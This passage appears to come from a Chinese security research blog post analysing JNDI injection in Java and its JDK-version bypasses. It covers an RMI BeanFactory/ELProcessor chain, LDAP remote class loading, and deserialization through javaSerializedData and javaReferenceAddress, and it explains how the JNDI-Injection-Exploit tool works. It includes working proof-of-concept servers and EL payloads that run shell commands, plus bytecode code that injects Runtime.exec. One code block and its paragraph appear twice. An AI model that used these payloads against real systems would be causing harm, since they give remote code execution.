在后续调用时，调用 `setter` 方法使用单个参数，且参数值为对应属性对象 `RefAddr` 的值 (`getContent`)。因此，实际上我们可以调用任意指定类的任意方法，并指定单个可控的参数（RCE的调用函数的点）

因为使用 `newInstance`创建实例（也就是后面`Poc`中的`ELProcessor`），所以只能调用无参构造，这就要求目标 `class` 得有无参构造方法，上面 `forceString` 可以给属性强制指定一个 `setter` 方法，参数为一个 `String` 类型

于是找到 `javax.el.ELProcessor` 作为目标 `class`，利用 `el` 表达式执行命令，工具 [JNDI-Injection-Bypass](https://github.com/welk1n/JNDI-Injection-Bypass) 中的 `EvilRMIServer.java` 部分代码如下

![zongjie3.png](https://storage.tttang.com/media/attachment/2022/05/25/5b518569-640f-4972-bb40-3e6395f31974.png)

所以整个绕过流程就是：
为了绕过`ConfigurationException`，需要满足`ref.getFactoryClassLocation()` 为空，只需要在远程 `RMI` 服务器返回的 `Reference` 对象中不指定 `Factory` 的 `codebase`

来到`NamingManager`，需要在攻击者本地`CLASSPATH`找到这个`Reference Factory`类并且在其中一块代码能执行`payload`，找到了`BeanFactory`作为工厂类，`BeanFactor`使用`newInstance`创建实例，所以只能调用无参构造，这就要求目标 `class` 得有无参构造方法且有办法执行相关命令，于是找到`ELProcessor`和`GroovyShell`

**总结：**绕过了`ConfigurationException`，进入`NamingManager`，使用`BeanFactor`创建`ELProcessor`/`GroovyShell`无参实例，然后`BeanFactor`根据别名去调用方法（执行`ELProcessor`中的`eval`方法）

**从JNDI_Injection_Bypass看另一种绕过方式：**

`groovy.lang.GroovyShell`，原理也是类似的
![zongjie4.png](https://storage.tttang.com/media/attachment/2022/05/25/93428660-6110-414b-9e97-455163b504fb.png)

传入的 `Reference`为 `ResourceRef` 类，后面通过反射的方式实例化 `Reference` 所指向的任意 `Bean Class`，调用 `setter` 方法为所有的属性赋值，该 `Bean Class` 的类名、属性、属性值，全都来自于 `Reference` 对象。`ResourceRef`构造器的第七个参数`factoryLocation`是远程加载`factory`的地址，比如是一个`url`,这里将其设置为`null`,达到绕过`ConfigurationException`限制

#### poc

因为要使用 `javax.el.ELProcessor`，所以需要 `Tomcat 8+`或`SpringBoot 1.2.x+`

服务端：

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("[*]Evil RMI Server is Listening on port: 6666");
        Registry registry = LocateRegistry.createRegistry( 6666);
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码
        ref.add(new StringRefAddr("forceString", "x=eval"));
        // 利用表达式执行命令
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash', '-c', 'touch /tmp/mi1k7ea']).start()\")"));
        System.out.println("[*]Evil command: touch /tmp/mi1k7ea");
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
```

服务端2

```java
import javax.el.ELProcessor;

public class Test {
    public static void main(String[] args) {
        String poc = "''.getClass().forName('javax.script.ScriptEngineManager')" +
                ".newInstance().getEngineByName('nashorn')" +
                ".eval(\"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);\")";
//        String poc = "''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass())" +
//                ".invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime')" +
//                ".invoke(null),'calc.exe')}";
//        String poc = "''.getClass().forName('javax.script.ScriptEngineManager')" +
//                ".newInstance().getEngineByName('JavaScript')" +
//                ".eval(\"java.lang.Runtime.getRuntime().exec('calc')\")";
        new ELProcessor().eval(poc);
    }
}
```

客户端：

```java
import javax.naming.Context;
import javax.naming.InitialContext;

public class Client {
    public static void main(String[] args) throws Exception {
        String uri = "rmi://localhost:6666/Object";
        Context ctx = new InitialContext();
        ctx.lookup(uri);
    }
}
```



## LDAP

### 低版本

我们可以通过`LDAP`服务来绕过`URLCodebase`实现远程加载，`LDAP`服务也能返回`JNDI Reference`对象，利用过程与`jndi` + `RMI Reference`基本一致，不同的是，`LDAP`服务中`lookup`方法中指定的远程地址使用的是`LDAP`协议，由攻击者控制`LDAP`服务端返回一个恶意`jndi Reference`对象，并且`LDAP`服务的`Reference`远程加载`Factory`类并不是使用`RMI Class Loader`机制，因此不受`trustURLCodebase`限制。

可以使用`marshalsec`开启`LDAP`服务

```shell
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/\#EvilClass
```

`LADP`服务前面的调用流程和`jndi`是基本一样，从`Obj`类的`decodeObject`方法这里就有些不太一样了，`decodeObject`方法内部调用了`decodeReference`方法
跟进`com.sun.jndi.ldap.Obj.java#decodeObject`，按照该函数的注释来看，其主要功能是解码从`LDAP Server`来的对象，该对象可能是序列化的对象，也可能是一个`Reference`对象。关于序列化对象的处理，我们看后面一节。这里摘取了`Reference`的处理方式：

```java
static Object decodeObject(Attributes var0) throws NamingException {
    String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));

    try {
        Attribute var1;
        if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
            ClassLoader var3 = helper.getURLClassLoader(var2);
            return deserializeObject((byte[])((byte[])var1.get()), var3);
        } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
            return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
        } else {
            var1 = var0.get(JAVA_ATTRIBUTES[0]);
//调用了decodeReference方法
            return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
        }
    } catch (IOException var5) {
        NamingException var4 = new NamingException();
        var4.setRootCause(var5);
        throw var4;
    }
}
```

`Obj`类的`decodeReference`方法根据`Ldap`传入的`addAttribute`属性构造并返回了一个新的`reference`对象引用

```java
private static Reference decodeReference(Attributes var0, String[] var1) throws NamingException, IOException {
        String var4 = null;
        Attribute var2;
        if ((var2 = var0.get(JAVA_ATTRIBUTES[2])) == null) {
            throw new InvalidAttributesException(JAVA_ATTRIBUTES[2] + " attribute is required");
        } else {
            String var3 = (String)var2.get();
            if ((var2 = var0.get(JAVA_ATTRIBUTES[3])) != null) {
                var4 = (String)var2.get();
            }
            //返回一个新的Reference对象引用
            Reference var5 = new Reference(var3, var4, var1 != null ? var1[0] : null);
            //获取第6个属性
            if ((var2 = var0.get(JAVA_ATTRIBUTES[5])) != null) {
               //省略部分代码
            }
            //直接返回reference对象
            return var5;
        }
}
```

`LADP`服务的`Reference`对象引用的获取和`jndi`注入中的不太一样，`jndi`是通过`ReferenceWrapper_Stub`对象的`getReference`方法获取`reference`对象，而`LADP`服务是根据传入的属性构造一个新的`reference`对象引用，接着获取了第6个属性并判断是否为空，如果第6个属性为`null`则直接返回新的`reference`对象引用。

```java
private static Reference decodeReference(Attributes var0, String[] var1) throws NamingException, IOException {
        String var4 = null;
        Attribute var2;
        if ((var2 = var0.get(JAVA_ATTRIBUTES[2])) == null) {
            throw new InvalidAttributesException(JAVA_ATTRIBUTES[2] + " attribute is required");
        } else {
            String var3 = (String)var2.get();
            if ((var2 = var0.get(JAVA_ATTRIBUTES[3])) != null) {
                var4 = (String)var2.get();
            }
            //返回一个新的Reference对象引用
            Reference var5 = new Reference(var3, var4, var1 != null ? var1[0] : null);
            //获取第6个属性
            if ((var2 = var0.get(JAVA_ATTRIBUTES[5])) != null) {
               //省略部分代码
            }
            //直接返回reference对象
            return var5;
        }
}
```

`LADP`服务的`Reference`对象引用的获取和`jndi`注入中的不太一样，`jndi`是通过`ReferenceWrapper_Stub`对象的`getReference`方法获取`reference`对象，而`LADP`服务是根据传入的属性构造一个新的`reference`对象引用，接着获取了第6个属性并判断是否为空，如果第6个属性为`null`则直接返回新的`reference`对象引用。

`reference`对象的三个属性:`className`，`classFactory`，`classFactoryLocation`）如下所示：
[![ldap_low5.png](https://storage.tttang.com/media/attachment/2022/05/25/54d90b72-d850-472c-a63d-d3bb838340a3.png)](https://storage.tttang.com/media/attachment/2022/05/25/54d90b72-d850-472c-a63d-d3bb838340a3.png)
接着会返回到`decodeObject`方法调用处，然后再返回到`LdapCtx`类的`c_lookup`方法调用处，接着往下执行调用`getObjectInstance`方法

```
protected Object c_lookup(Name var1, Continuation var2) throws NamingException {
    var2.setError(this, var1);
    Object var3 = null;

    Object var4;
    try {
        SearchControls var22 = new SearchControls();
        var22.setSearchScope(0);
        var22.setReturningAttributes((String[])null);
        var22.setReturningObjFlag(true);
        LdapResult var23 = this.doSearchOnce(var1, "(objectClass=*)", var22, true);
        this.respCtls = var23.resControls;
        if (var23.status != 0) {
            this.processReturnCode(var23, var1);
        }

        if (var23.entries != null && var23.entries.size() == 1) {
            LdapEntry var25 = (LdapEntry)var23.entries.elementAt(0);
            var4 = var25.attributes;
            Vector var8 = var25.respCtls;
            if (var8 != null) {
                appendVector(this.respCtls, var8);
            }
        } else {
            var4 = new BasicAttributes(true);
        }

        if (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[2]) != null) {
//var3接收reference对象
            var3 = Obj.decodeObject((Attributes)var4);
        }

        if (var3 == null) {
            var3 = new LdapCtx(this, this.fullyQualifiedName(var1));
        }
    } catch (LdapReferralException var20) {
        LdapReferralException var5 = var20;
        if (this.handleReferrals == 2) {
            throw var2.fillInException(var20);
        }

        while(true) {
            LdapReferralContext var6 = (LdapReferralContext)var5.getReferralContext(this.envprops, this.bindCtls);

            try {
                Object var7 = var6.lookup(var1);
                return var7;
            } catch (LdapReferralException var18) {
                var5 = var18;
            } finally {
                var6.close();
            }
        }
    } catch (NamingException var21) {
        throw var2.fillInException(var21);
    }

    try {
//调用了getObjectInstance方法
        return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);
    } catch (NamingException var16) {
        throw var2.fillInException(var16);
    } catch (Exception var17) {
        NamingException var24 = new NamingException("problem generating object using object factory");
        var24.setRootCause(var17);
        throw var2.fillInException(var24);
    }
}
```

`c_lookup`方法将`var3`（`reference`对象）传给了`getObjectInstance`方法的`refInfo`参数，继续跟进分析`getObjectInstance`方法

```
    public static Object getObjectInstance(Object refInfo, Name name, Context nameCtx , Hashtable<?,?> environment, Attributes attrs) throws Exception {
            ObjectFactory factory;
            //获取对象工厂
            ObjectFactoryBuilder builder = getObjectFactoryBuilder();
            if (builder != null) {
                // builder must return non-null factory
                factory = builder.createObjectFactory(refInfo, environment);
                if (factory instanceof DirObjectFactory) {
                    return ((DirObjectFactory)factory).getObjectInstance(
                        refInfo, name, nameCtx, environment, attrs);
                } else {
                    return factory.getObjectInstance(refInfo, name, nameCtx,
                        environment);
                }
            }

            // use reference if possible
            Reference ref = null;
            //判断reference对象是否为Reference
            if (refInfo instanceof Reference) {
                 //转换为Reference类型
                ref = (Reference) refInfo;
            } else if (refInfo instanceof Referenceable) {
                ref = ((Referenceable)(refInfo)).getReference();
            }

            Object answer;
            //reference对象是否为空
            if (ref != null) {
                //获取工厂类名Exp
                String f = ref.getFactoryClassName();
                if (f != null) {
                    // if reference identifies a factory, use exclusively
                    //根据工厂类远程获取对象引用
                    factory = getObjectFactoryFromReference(ref, f);
                    if (factory instanceof DirObjectFactory) {
                        return ((DirObjectFactory)factory).getObjectInstance(
                            ref, name, nameCtx, environment, attrs);
                    } else if (factory != null) {
                        return factory.getObjectInstance(ref, name, nameCtx,
                                                         environment);
                    }
                    // No factory found, so return original refInfo.
                    // Will reach this point if factory class is not in
                    // class path and reference does not contain a URL for it
                    return refInfo;

                } else {
                    // if reference has no factory, check for addresses
                    // containing URLs
                    // ignore name & attrs params; not used in URL factory

                    answer = processURLAddrs(ref, name, nameCtx, environment);
                    if (answer != null) {
                        return answer;
                    }
                }
            }

            // try using any specified factories
            answer = createObjectFromFactories(refInfo, name, nameCtx,
                                               environment, attrs);
            return (answer != null) ? answer : refInfo;

    }
```

`getObjectInstance`方法将`reference`对象转换为`Reference`类型并判断`reference`对象是否为空，如果不为空则从`reference`引用中获取工厂类`Exp`名字，接着调用`getObjectFactoryFromReference`方法根据工厂类Exp名字获取远程调用对象。

`getObjectFactoryFromReference`方法实现如下：

```
    static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName) throws IllegalAccessException,InstantiationException, MalformedURLException {
        Class<?> clas = null;

        // Try to use current class loader
        try {
             //尝试先在本地加载Exp类
             clas = helper.loadClass(factoryName);
        } catch (ClassNotFoundException e) {
            // ignore and continue
            // e.printStackTrace();
        }
        // All other exceptions are passed up.

        // Not in class path; try to use codebase
        String codebase;
        //获取远程地址
        if (clas == null && (codebase = ref.getFactoryClassLocation()) != null) {
            try {
                //loadClass方法远程加载Exp类
                clas = helper.loadClass(factoryName, codebase);
            } catch (ClassNotFoundException e) {

            }
        }

        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    }
```

![ldap_low6.png](https://storage.tttang.com/media/attachment/2022/05/25/e81b0bd5-336c-4141-8925-dc09a0ccfa3d.png)
可以看到`LDAP`服务跟`jndi`一样，会尝试先在本地查找加载`Exp`类，如果本地没有找到`Exp`类，那么`getFactoryClassLocation`方法会获取远程加载的`url`地址，如果不为空则根据远程`url`地址使用类加载器`URLClassLoader`来加载`Exp`类，通过分析发现`LDAP`服务的整个利用流程都没有`URLCodebase`限制。
看一下整个调用站栈
![ldap_low7.png](https://storage.tttang.com/media/attachment/2022/05/25/b956cc02-77f5-47b0-91fb-b50bd619731e.png)

### 高版本

在`jdk8u191`以上的版本中修复了`LDAP`服务远程加载恶意类这个漏洞，`LDAP`服务在进行远程加载之前也添加了系统属性`trustURLCodebase`的限制，通过分析在`jdk8u191`版本发现，在`loadClass`方法内部添加了系统属性`trustURLCodebase`的判断，如果`trustURLCodebase`为`false`就直接返回`null`，只有当`trustURLCodebase`值为`true`时才允许远程加载。
[![ldap_low8.png](https://storage.tttang.com/media/attachment/2022/05/25/0a671754-9117-443b-8858-3919227da73d.png)](https://storage.tttang.com/media/attachment/2022/05/25/0a671754-9117-443b-8858-3919227da73d.png)

在高版本 `JDK` 中需要通过 `com.sun.jndi.ldap.object.trustURLCodebase` 选项去启用。这个限制在 `JDK 11.0.1`、`8u191`、`7u201`、`6u211` 版本时加入，略晚于 `RMI` 的远程加载限制。

#### 序列化绕过

`com.sun.jndi.ldap.Obj.java#decodeObject`存在对`JAVA_ATTRIBUTES[SERIALIZED_DATA]`的判断
[这里](http://tttang.com/archive/1611/#流程分析)提到 `com.sun.jndi.ldap.Obj.java#decodeObject` 主要功能是解码从`LDAP Server`来的对象，该对象可能是序列化的对象，也可能是一个`Reference`对象。之前讲到`Reference`对象，现在讲一下传来的是序列化的对象这种情况。
如果是序列化对象会调用`deserializeObject`方法
[![serialize1.png](https://storage.tttang.com/media/attachment/2022/05/25/0f23b7e2-d585-4310-a4cd-f3705039f291.png)](https://storage.tttang.com/media/attachment/2022/05/25/0f23b7e2-d585-4310-a4cd-f3705039f291.png)
进入`deserializeObject`方法，发现会进行`readObject`
[![serialize2.png](https://storage.tttang.com/media/attachment/2022/05/25/131b7fe6-fedf-45f1-b860-db06560a5dfe.png)](https://storage.tttang.com/media/attachment/2022/05/25/131b7fe6-fedf-45f1-b860-db06560a5dfe.png)
看一下调用栈
[![serialize3.png](https://storage.tttang.com/media/attachment/2022/05/25/6f3b9090-de13-46b7-9447-5058855844cc.png)](https://storage.tttang.com/media/attachment/2022/05/25/6f3b9090-de13-46b7-9447-5058855844cc.png)

##### poc

```java
import com.alter.JNDI_LDAP.util.serializeObject;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;


import static com.alter.JNDI_LDAP.util.serializeObject.getPayload;
import static com.alter.JNDI_LDAP.util.serializeObject.serializeObject;

public class Ldap {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] argsx) {
        String[] args = new String[]{"http://127.0.0.1:8000/#EvilClass", "1389"};
        int port = 0;
        if (args.length < 1 || args[0].indexOf('#') < 0) {
            System.err.println(Ldap.class.getSimpleName() + " <codebase_url#classname> [<port>]"); //$NON-NLS-1$
            System.exit(-1);
        } else if (args.length > 1) {
            port = Integer.parseInt(args[1]);
        }

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        /**
         *
         */
        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }

        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {

            //jdk8u191之后
            e.addAttribute("javaClassName", "foo");
            //getObject获取Gadget

            e.addAttribute("javaSerializedData", serializeObject(getPayload()));

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

和低版本`JDK`运行的`Server`端代码差不多，就把`sendResult`处的代码改成能触发反序列化漏洞的利用链就可以

#### RefAddress

`com.sun.jndi.ldap.Obj.java#decodeReference`函数在对普通的`Reference`还原的基础上，还可以进一步对`RefAddress`做还原处理，其中还原过程中，也调用了`deserializeObject`函数，这意味着我们通过满足`RefAddress`的方式，也可以达到上面第一种的效果。
需满足以下条件：
1.第一个字符为分隔符
2.第一个分隔符与第二个分隔符之间，表示`Reference`的`position`，为`int`类型
3.第二个分隔符与第三个分隔符之间，表示`type`，类型
4.第三个分隔符是双分隔符的形式，则进入反序列化的操作
5.序列化数据用`base64`编码
`payload`如下

```
//方式二
e.addAttribute("javaClassName", "foo");
e.addAttribute("javaReferenceAddress","$1$String$$"+new BASE64Encoder().encode(serializeObject(getPayload())));
e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
result.sendSearchEntry(e);
result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
```

[![serialize4.png](https://storage.tttang.com/media/attachment/2022/05/25/3eda86ed-bbea-4b55-b2c2-a8e25724d918.png)](https://storage.tttang.com/media/attachment/2022/05/25/3eda86ed-bbea-4b55-b2c2-a8e25724d918.png)

[![serialize5.png](https://storage.tttang.com/media/attachment/2022/05/25/6e5bcaff-c030-4cf3-85dc-85f19a2917ab.png)](https://storage.tttang.com/media/attachment/2022/05/25/6e5bcaff-c030-4cf3-85dc-85f19a2917ab.png)

[![serialize6.png](https://storage.tttang.com/media/attachment/2022/05/25/6e95b71e-17aa-4b7d-8eb6-4cac9583a921.png)](https://storage.tttang.com/media/attachment/2022/05/25/6e95b71e-17aa-4b7d-8eb6-4cac9583a921.png)
触发点二只是一个锦上添花的步骤，我们可以直接用第一种方法，第二种在第一种不能用的情况下可以试试。

## JNDI search

lookup()方式是我们能控制ctx.lookup()参数进行对象的查找，LDAP服务器也是攻击者创建的。对于LDAP服务来说，大多数应用使用的是ctx.search()进行属性的查询，这时search会同时使用到几个参数，并且这些参数一般无法控制，但是会受到外部参数的影响，同时search()方式能被利用需要RETURN_OBJECT为true

对于search方式的攻击需要有对目录属性修改的权限，因此有一些限制，在下面这些场景下可用：

- 恶意员工：上面使用了几种利用都使用了modifyAttributes方法，但是需要有修改权限，如果员工具有修改权限那么就能像上面一样注入恶意的属性
- 脆弱的LDAP服务器：如果LDAP服务器被入侵了，那么入侵LDAP服务器的攻击者能够进入LDAP服务器修改返回恶意的对象，对用的应用进行查询时就会受到攻击
- 易受攻击的应用程序：利用易受攻击的一个应用，如果入侵了这个应用，且它具有对LDAP的写权限，那么利用它使注入LDAP属性，那么其他应用使用LDAP服务是也会遭到攻击
- 用于访问LDAP目录的公开Web服务或API：很多现代LDAP服务器提供用于访问LDAP目录的各种Web API。可以是功能或模块，例如REST API，SOAP服务，DSML网关，甚至是单独的产品（Web应用程序）。其中许多API对用户都是透明的，并且仅根据LDAP服务器的访问控制列表（ACL）对它们进行授权。某些ACL允许用户修改其任何除黑名单外的属性
- 中间人攻击：尽管当今大多数LDAP服务器使用TLS进行加密他们的通信后，但在网络上的攻击者仍然可能能够进行攻击并修改那些未加密的证书，或使用受感染的证书来修改属性
- ...

### 已知漏洞

- Spring Security and LDAP projects
- FilterBasedLdapUserSearch.searchForUser()
- SpringSecurityLdapTemplate.searchForSingleEntry()
- SpringSecurityLdapTemplate.searchForSingleEntryInternal(){

## JNDI-Injection-Exploit

常用的一个工具，提供class的远程加载功能，根据命令行输入动态生成class并放在服务器上

### ServerStart

作为程序的启动类，处理传入的参数和开启几个server的线程，并打印一些初始信息

### JettyServer

将生成好的.class文件加入http server中让被外部访问

DownloadServlet会对下载/访问情况作log记录，命令部分在

```java
transformed = insertCommad(in, command);
```

```java
public static byte[] insertCommand(InputStream inputStream, String command) throws Exception{
    ClassReader cr = new ClassReader(inputStream);
    ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
    ClassVisitor cv = new TransformClass(cw,command);
    cr.accept(cv, 2);
    return cw.toByteArray();
}
```

这里Class开头的三个类都属于ASM库，可以用来操作字节码

- ClassReader

将.class文件读入到ClassReader的字节数组中，accept方法接受一个ClassVisitor实现类，并按照顺序调用ClassVisitor中的方法

- ClassWriter

是ClassVisitor的子类，是和ClassReader对应的类，将修改后的类的字节码的内容以字节数组形式输出

- ClassVisitor

一个抽象类，有很多方法，其中`public MethodVisitor visitMethod(xxxx)`方法，是当扫描器扫描到类的方法时调用，各个参数分别为修饰符、方法名、方法签名、泛型信息、抛出的异常

综上，这段插入命令的代码是创建一个ClassReader读入class文件，创建ClassWriter并经过TransformClass的修饰生成ClassVisitor对象，调用ClassReader的accept方法（传入这个ClassVisitor对象），按顺序执行ClassVisitor中的方法

这个TransformClass是自行实现的

```java
static class TransformClass extends ClassVisitor{
    String command;
    TransformClass(ClassVisitor classVisitor, String command){
        super(Opcodes.ASM7,classVisitor);
        this.command = command;
    }
    @Override
    public MethodVisitor visitMethod(
            final int access,
            final String name,
            final String descriptor,
            final String signature,
            final String[] exceptions) {
        MethodVisitor mv = cv.visitMethod(access, name, descriptor, signature, exceptions);
        if(name.equals("<clinit>")){
            return new TransformMethod(mv,command);
        }else{
            return mv;
        }
    }
}
```

它作为ClassVisitor的实现类，覆写了visitMethod方法，最后return的对象是TransformedMethod

```java
static class TransformMethod extends MethodVisitor{
    String command;
    TransformMethod(MethodVisitor methodVisitor,String command) {
        super(Opcodes.ASM7, methodVisitor);
        this.command = command;
    }
    @Override
    public void visitCode(){
        Label label0 = new Label();
        Label label1 = new Label();
        Label label2 = new Label();
        mv.visitTryCatchBlock(label0, label1, label2, "java/lang/Exception");
        mv.visitLabel(label0);
        mv.visitLdcInsn(command);
        mv.visitVarInsn(Opcodes.ASTORE, 0);
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
        mv.visitVarInsn(Opcodes.ALOAD, 0);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
        mv.visitInsn(Opcodes.POP);
        mv.visitLabel(label1);
        Label label3 = new Label();
        mv.visitJumpInsn(Opcodes.GOTO, label3);
        mv.visitLabel(label2);
        mv.visitVarInsn(Opcodes.ASTORE, 0);
        mv.visitVarInsn(Opcodes.ALOAD, 0);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Exception", "printStackTrace", "()V", false);
        mv.visitLabel(label3);
    }
}
```

可以看到这个方法是从字节码级别插入Runtime.exec的内容

综上，最后返回的字节码只要被扫描类方法，就会命令执行；直接下载字节码，会发现实际就是在ExecTemplateJDK7中多了个Runtime.getRuntime().exec()的静态代码块

### LDAPRefServer

使用InMemoryDirectoryServer启动了一个ldap服务端，额外实现了OperationInterceptor用来拦截ldap通信

ldap查询结果会传给processSearchResult处理，在sendResult中根据codebase获取的javaFactory 也就是template下的class文件，最后将这些信息写入到了result中

```java
@Override
    public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
        String base = result.getRequest().getBaseDN();
        Entry e = new Entry(base);
        try {
            sendResult(result, base, e);
        }
        catch ( Exception e1 ) {
            e1.printStackTrace();
        }
    }
    protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
        String cbstring = this.codebase.toString();
        String javaFactory = Mapper.references.get(base);
        if (javaFactory != null){
            URL turl = new URL(cbstring + javaFactory.concat(".class"));
            System.out.println(getLocalTime() + " [LDAPSERVER] >> Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", javaFactory);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }else {
            System.out.println(getLocalTime() + " [LDAPSERVER] >> Reference that matches the name(" + base + ") is not found.");
        }
    }
}
```

当客户端来lookup这个生成好的ldap远程地址时，会在各种lookup后收到一个Reference对象，在处理过程中会导致静态代码块的命令执行

lookup--------------->DirectoryManager.getObjectInstance->NamingManager.getObjectFactoryFromReference

### RMIRefServer

跟RMI的利用类似，不详说

lookup--------------->RegisterContext.decodeObject->NamingManager.getObjectInstance->NamingManager.getObjectFactoryFromReference

------

{{% spoiler "以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（" %}}

[JNDI注入分析](http://tttang.com/archive/1611/)

[Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）](https://paper.seebug.org/1091/)

[Z3专栏 | JNDI注入和工具分析](https://www.freebuf.com/articles/web/317625.html)

[浅析JNDI注入](https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/)

[浅析高低版JDK下的JNDI注入及绕过](https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/)

[由JNDI注入引发的Spring Framework反序列化漏洞](https://www.mi1k7ea.com/2019/09/02/%E7%94%B1JNDI%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84Spring-Framework%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

{{% /spoiler %}}









